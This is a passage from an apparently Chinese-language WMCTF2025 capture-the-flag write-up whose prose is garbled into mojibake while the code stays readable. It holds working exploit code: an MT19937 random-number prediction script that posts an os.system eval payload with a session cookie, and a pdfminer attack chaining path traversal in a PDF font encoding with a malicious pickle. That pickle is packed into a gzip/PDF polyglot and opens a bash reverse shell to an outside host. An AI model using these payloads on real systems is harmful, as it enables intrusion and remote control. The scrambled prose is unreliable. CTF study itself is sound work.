number">32</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#64ä½æ•°ï¼ŒåŒ…å«ä¸¤ä¸ª32ä½æ•°ï¼Œå–ç¬¬ä¸€ä¸ª32ä½æ•°ï¼Œ64ä½ä¸32ä¸ª1æŒ‰ä½ä¸ï¼Œç»“æœå‰©ä¸‹ä½ä½32ä½</span>        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span>  <span class="token comment">#å³ç§»32ä½ï¼Œä¿ç•™é«˜ä½32ä½</span>    <span class="token comment"># else:</span>    <span class="token comment">#     arr.append(l[i] &amp; (2**32 - 1))  #ä¿ç•™ä½32ä½</span>    <span class="token comment">#     arr.append(l[i] &amp; (2**64 - 1) >> 32)  #ä¿ç•™ä¸­é—´32ä½</span>    <span class="token comment">#     arr.append(l[i] >> 64)  #ä¿ç•™é«˜32ä½</span>rc <span class="token operator">=</span> RandCrack<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#è§£é¢˜å…³é”®å‡½æ•°</span><span class="token keyword">for</span> i <span class="token keyword">in</span> arr<span class="token punctuation">:</span>    rc<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  <span class="token comment">#æŒ‰é¡ºåºä¼ å…¥RandCrackå‡½æ•°</span>flag <span class="token operator">=</span> rc<span class="token punctuation">.</span>predict_getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>  <span class="token comment">#é¢„æµ‹ä¸‹ä¸€ä¸ª32ä½æ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å°±èƒ½é¢„æµ‹æ¯ 624 ä¸ªæ•°çš„ä¸‹ä¸€ä¸ªæ•°äº†ï¼Œäºæ˜¯å°±å¯ä»¥æ‰“ payload ï¼Œç»“æœå‘ç°è¿™é‡Œæœ‰ä¸ªå¤§éé¢„æœŸ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtin__'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bro ä»¥ä¸ºè‡ªå·±æ˜¯ py2ï¼Œåº”è¯¥æ˜¯ builtins çš„ï¼Œé‚£ç›´æ¥æ‰“äº†</p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> MT19937_expecturl <span class="token operator">=</span> <span class="token string">"http://49.232.42.74:32642/api"</span>key <span class="token operator">=</span> MT19937_expect<span class="token punctuation">.</span>expect_mt19937<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># for _ in range(624):</span>cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"session"</span><span class="token punctuation">:</span>    <span class="token string">"eyJ1c2VyX2lkIjoiMzc4NzkzOTc3NSIsInVzZXJuYW1lIjoidGVzdCJ9.aM56QQ.z3U3JDKwnAzLDmX4K4Xe23mgqiM"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span> key<span class="token punctuation">,</span> <span class="token string">"payload"</span><span class="token punctuation">:</span> <span class="token string">"__import__('os').system('cat /flag > static/1.txt')"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span>proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://127.0.0.1:8083"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"Not Allowed:"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> key<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"(\d+)"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> num<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="pdf2textï¼ˆå¤ç°ï¼‰"><a href="#pdf2textï¼ˆå¤ç°ï¼‰" class="headerlink" title="pdf2textï¼ˆå¤ç°ï¼‰"></a>pdf2textï¼ˆå¤ç°ï¼‰</h1><p>é“¾å­è·Ÿå‡ºæ¥äº†æœ€åæ­»åœ¨ä¼  gz ä¸Šäº†</p><p>app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfparser <span class="token keyword">import</span> PDFParser<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>pdfdocument <span class="token keyword">import</span> PDFDocument<span class="token keyword">import</span> os<span class="token punctuation">,</span> io<span class="token keyword">from</span> pdfutils <span class="token keyword">import</span> pdf_to_textapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'uploads'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>  <span class="token comment"># 2MB limit</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'No file part'</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename    <span class="token keyword">if</span> filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'No selected file'</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">if</span> <span class="token string">'..'</span> <span class="token keyword">in</span> filename <span class="token keyword">or</span> <span class="token string">'/'</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'directory traversal is not allowed'</span><span class="token punctuation">,</span> <span class="token number">403</span>     pdf_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    pdf_content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># just if is a pdf</span>        parser <span class="token operator">=</span> PDFParser<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>pdf_content<span class="token punctuation">)</span><span class="token punctuation">)</span>        doc <span class="token operator">=</span> PDFDocument<span class="token punctuation">(</span>parser<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>pdf_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pdf_content<span class="token punctuation">)</span>    md_filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    txt_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> md_filename<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pdf_to_text<span class="token punctuation">(</span>pdf_path<span class="token punctuation">,</span> txt_path<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>         <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>txt_path<span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pdfutils.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>high_level <span class="token keyword">import</span> extract_pages<span class="token keyword">from</span> pdfminer<span class="token punctuation">.</span>layout <span class="token keyword">import</span> LTTextContainer<span class="token keyword">def</span> <span class="token function">pdf_to_text</span><span class="token punctuation">(</span>pdf_path<span class="token punctuation">,</span> txt_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>txt_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> txt<span class="token punctuation">:</span>        <span class="token keyword">for</span> page_layout <span class="token keyword">in</span> extract_pages<span class="token punctuation">(</span>pdf_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> element <span class="token keyword">in</span> page_layout<span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>element<span class="token punctuation">,</span> LTTextContainer<span class="token punctuation">)</span><span class="token punctuation">:</span>                    txt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>element<span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    txt<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æºç é€»è¾‘å¾ˆç®€å•ï¼Œæ–‡ä»¶æ“ä½œè¿™é‡ŒæŠŠç›®å½•ç©¿è¶Š ban æ‰äº†ï¼Œé‚£ä¼°è®¡å°±æ˜¯ä» pdfminer è‡ªèº«å…¥æ‰‹</p><p>ä½†æ˜¯ä¸€ä¸ª pdf è½¬æ–‡æœ¬çš„åº“èƒ½æœ‰ä»€ä¹ˆåå¿ƒæ€å‘¢ï¼Œæ€»ä¸èƒ½ä¸“é—¨ç»™ä¸ª eval ï¼Ÿç¨åŠ æ€ç´¢ï¼Œåœ¨è¿™ä¸ªåº“é‡Œé¢æœäº†ä¸€ä¸‹ <code>pickle.load</code>ï¼Œç»“æœè¿˜çœŸæœ‰</p><p><img src="/blog/2025/09/20/WMCTF2025/IMG-20250920192658903.png"></p><p>hint ä¹Ÿæ˜¯éªŒè¯äº†è¿™ä¸€ç‚¹</p><p>å¤šæ¬¡è°ƒè¯•ä¹‹åå¾—åˆ°è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">CMapDB.get_cmapCMapDB._load_dataPDFCIDFont.get_cmap_from_specPDFCIDFont.__init__PDFResourceManager.get_fontPDFPageInterpreter.init_resourcesPDFPageInterpreter.render_contentshigh_level.extract_pages<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/09/20/WMCTF2025/IMG-20250921102056771.png"></p><p><img src="/blog/2025/09/20/WMCTF2025/IMG-20250921102135112.png"></p><p><img src="/blog/2025/09/20/WMCTF2025/IMG-20250921102448451.png"></p><p>è€Œæœ€åè¿™é‡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@classmethod</span><span class="token keyword">def</span> <span class="token function">_load_data</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>    name <span class="token operator">=</span> name<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    filename <span class="token operator">=</span> <span class="token string">"%s.pickle.gz"</span> <span class="token operator">%</span> name    log<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">"loading: %r"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    cmap_paths <span class="token operator">=</span> <span class="token punctuation">(</span>        os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"CMAP_PATH"</span><span class="token punctuation">,</span> <span class="token string">"/usr/share/pdfminer/"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"cmap"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span>    <span class="token keyword">for</span> directory <span class="token keyword">in</span> cmap_paths<span class="token punctuation">:</span>        path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>directory<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            gzfile <span class="token operator">=</span> gzip<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>gzfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾ os.path.join ä¸­çš„ filename å¯æ§å°±ä¼šå‡ºç°ç›®å½•ç©¿è¶Šçš„æƒ…å†µ</p><p>ç»¼åˆä¸€ä¸‹åˆ¤æ–­æ¡ä»¶å¯ä»¥å¾—åˆ°å¿…è¦çš„å‡ æ®µï¼Œæ³¨æ„ pdf è¯­æ³•ä¸­ä½¿ç”¨ <code>#</code> å¯ä»¥å®ç°å¯¹ <code>/</code> è¿›è¡Œç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨å€¼é‡Œé¢æ·»åŠ è·¯å¾„</p><pre class="line-numbers language-pdf" data-language="pdf"><code class="language-pdf">&#x2F;Type&#x2F;Font&#x2F;Encoding &#x2F;#2Fapp#2Fuploads#2F1&#x2F;Subtype&#x2F;CIDFontType0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å­å°±èƒ½åšåˆ° pickle.loads æˆ‘ä»¬ gzip å‹ç¼©åçš„ pkl äº†</p><p>æ¥ä¸‹æ¥å°±æ˜¯æœ€è‰°éš¾çš„éƒ¨åˆ†äº†ï¼Œæˆ‘ä»¬æ€ä¹ˆä¸Šä¼ ä¸€ä¸ª gzip å‹ç¼©åŒ…åŒæ—¶è¦è¿‡ pdf æ£€æµ‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment"># just if is a pdf</span>    parser <span class="token operator">=</span> PDFParser<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>pdf_content<span class="token punctuation">)</span><span class="token punctuation">)</span>    doc <span class="token operator">=</span> PDFDocument<span class="token punctuation">(</span>parser<span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•å¯ä»¥å‘ç° pdf æ£€æµ‹åªæ£€æµ‹ä¸‹é¢è¿™æ®µæ˜¯å¦åœ¨æœ«å°¾</p><pre class="line-numbers language-pdf" data-language="pdf"><code class="language-pdf">trailer&lt;&lt;&#x2F;Root 1 0 R&gt;&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯å’Œæ­£å¸¸å‘½ä»¤è¡Œçš„ <code>gzip -d</code> ä¸ä¸€æ ·ï¼Œpython çš„ gzip è§£å‹ç¼©æå…¶ä¸¥æ ¼ï¼Œå³ä½¿åœ¨ gzip åŒ…çš„æœ€åè¿½åŠ æ˜æ–‡ä¹Ÿä¼šåˆ¤å®šä¸ºä¸é€šè¿‡</p><br>å…¶å®ï¼Œgzip å¯ä»¥æŒ‡å®šå‹ç¼©ç­‰çº§ï¼Œç­‰çº§ä¸º 0 åŸºæœ¬éƒ½æ˜¯æ˜æ–‡ï¼Œç„¶åå°±å‡ºäº†...<p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gzipsource <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""cossystemp00g0(S'bash -c "bash -i >&amp; /dev/tcp/vpsip/23333 0>&amp;1"'tR."""</span><span class="token keyword">with</span> gzip<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pickle.gz"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f_out<span class="token punctuation">:</span>    f_out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pdf"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    pdf_content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> gzip<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>pdf_content<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pickle.gz"</span><span class="token punctuation">,</span> <span class="token string">"ab"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f_out<span class="token punctuation">:</span>        f_out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1.pdf</p><pre class="line-numbers language-pdf" data-language="pdf"><code class="language-pdf">%PDF-1.4%DUMMY8 0 obj&lt;&lt;&#x2F;PatternType 2&#x2F;Shading&lt;&lt;  &#x2F;Function&lt;&lt;    &#x2F;Domain[0 1]    &#x2F;C0[0 0 1]    &#x2F;C1[1 0.6 0]    &#x2F;N 1    &#x2F;FunctionType 2  &gt;&gt;  &#x2F;ShadingType 2  &#x2F;Coords[46 400 537 400]  &#x2F;Extend[false false]  &#x2F;ColorSpace&#x2F;DeviceRGB&gt;&gt;&#x2F;Type&#x2F;Pattern&gt;&gt;endobj5 0 obj&lt;&lt;&#x2F;Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]&#x2F;Type&#x2F;Font&#x2F;BaseFont&#x2F;PAXEKO+SourceSansPro-Bold&#x2F;LastChar 102&#x2F;Encoding &#x2F;#2Fapp#2Fuploads#2F1&#x2F;FontMatrix [0.1 0 0 0.1 0 (1\);\nprint\(&quot;&quot;\)\n&#x2F;&#x2F;)]&#x2F;Subtype&#x2F;CIDFontType0&#x2F;FirstChar 65&#x2F;FontDescriptor 9 0 R&#x2F;ToUnicode 11 0 R&gt;&gt;endobj2 0 obj&lt;&lt;&#x2F;Kids[3 0 R]&#x2F;Type&#x2F;Pages&#x2F;Count 1&gt;&gt;endobj9 0 obj&lt;&lt;&#x2F;Type&#x2F;FontDescriptor&#x2F;ItalicAngle 0&#x2F;Ascent 751&#x2F;FontBBox[-6 -12 579 713]&#x2F;FontName&#x2F;PAXEKO+SourceSansPro-Bold&#x2F;StemV 100&#x2F;CapHeight 713&#x2F;Flags 32&#x2F;FontFile3 10 0 R&#x2F;Descent -173&#x2F;MissingWidth 250&gt;&gt;endobj6 0 obj&lt;&lt;&#x2F;Length 128&gt;&gt;stream47 379 489 230 re S&#x2F;Pattern csBT  50 500 Td  117 TL  &#x2F;F1 150 Tf  &#x2F;P1 scn  (AbCdEf) Tj  &#x2F;P2 scn  (AbCdEf) &#39;\nETendstreamendobj3 0 obj&lt;&lt;&#x2F;Type&#x2F;Page&#x2F;Resources 4 0 R&#x2F;Contents 6 0 R&#x2F;Parent 2 0 R&#x2F;MediaBox[0 0 595.2756 841.8898]&gt;&gt;endobj10 0 obj&lt;&lt;&#x2F;Length 800&#x2F;Subtype&#x2F;Type2&gt;&gt;streamendstreamendobj7 0 obj&lt;&lt;&#x2F;PatternType 1&#x2F;Matrix[1 0 0 1 50 0]&#x2F;Length 58&#x2F;TilingType 1&#x2F;BBox[0 0 16 16]&#x2F;YStep 16&#x2F;PaintType 1&#x2F;Resources&lt;&lt;&gt;&gt;&#x2F;XStep 16&gt;&gt;stream0.65 g0 0 16 16 re f0.15 g0 0 8 8 re f8 8 8 8 re fendstreamendobj4 0 obj&lt;&lt;&#x2F;Pattern&lt;&lt;  &#x2F;P1 7 0 R  &#x2F;P2 8 0 R&gt;&gt;&#x2F;Font&lt;&lt;  &#x2F;F1 5 0 R&gt;&gt;&gt;&gt;endobj1 0 obj&lt;&lt;&#x2F;Pages 2 0 R&#x2F;Type&#x2F;Catalog&#x2F;OpenAction[3 0 R &#x2F;Fit]&gt;&gt;endobjxref0 110000000000 65535 f0000002260 00000 n0000000522 00000 n0000000973 00000 n0000002178 00000 n0000000266 00000 n0000000794 00000 n0000001953 00000 n0000000015 00000 n0000000577 00000 n0000001085 00000 ntrailer&lt;&lt;&#x2F;ID[(DUMMY) (DUMMY)]&#x2F;Root 1 0 R&#x2F;Size 11&gt;&gt;startxref2333%%EOF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Shopping-company1ï¼ˆUnsolvedï¼‰"><a href="#Shopping-company1ï¼ˆUnsolvedï¼‰" class="headerlink" title="Shopping company1ï¼ˆUnsolvedï¼‰"></a>Shopping company1ï¼ˆUnsolvedï¼‰</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@tool</span> <span class="token keyword">def</span> <span class="token 